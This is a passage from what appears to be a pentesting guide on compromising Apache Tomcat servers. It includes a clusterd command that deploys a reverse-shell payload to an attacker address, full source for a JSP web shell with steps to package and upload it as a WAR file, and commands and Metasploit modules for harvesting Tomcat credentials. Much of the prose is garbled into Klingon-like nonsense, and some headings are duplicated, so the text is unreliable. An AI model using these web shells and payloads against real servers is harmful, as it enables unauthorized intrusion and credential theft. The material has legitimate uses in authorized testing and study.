Once you have selected a module, you can use the `show options` command to view and set the required options for the module. After setting the options, you can use the `exploit` command to launch the attack.

#### Conclusion

Culsterd is a powerful tool that can be used to exploit vulnerabilities in Apache Tomcat servers. By using its modules, you can perform various attacks and gain unauthorized access to the target server. However, it is important to note that using Culsterd for unauthorized purposes is illegal and unethical. Always ensure that you have proper authorization before using this tool.
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Qap manual - Web shell

Qap **index.jsp** vItlhutlh [content](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
### Manual Method 2

Get a JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) and create a WAR file:

### Manual Method 2

[http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html) jIvuvDI' 'ej 'oH 'ej 'ay' 'ej qetlh jatlh:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Tomcat credentials file-ghu' _tomcat-users.xml_ Daq.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Other ways to gather Tomcat credentials:

<p>ghItlhvam: Tomcat credentials yu'wIvqu' 'ej yu'wIvqu' 'e' vItlhutlh.</p>
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## lo'la' tomcat scanning tools

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## References
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

vItlhutlh vulnerabilities vItlhutlh 'e' vItlhutlh. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
